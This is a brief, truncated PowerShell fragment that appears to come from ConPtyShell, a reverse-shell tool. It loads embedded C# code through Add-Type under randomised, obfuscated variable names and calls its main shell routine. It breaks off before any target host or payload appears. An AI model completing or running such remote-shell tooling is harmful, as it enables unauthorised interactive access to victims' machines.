...
{   
    ...
    Add-Type -TypeDefinition $vTPVXeSQ99 -Language CSharp;
    $vhNfbOIv99 = [ConPtyShellMainClass]::ConPtyShellMain($NXZrLFqU99)
    Write-Output $vhNfbOIv99
}
$vTPVXeSQ99 = @"
using System;
using System.IO;
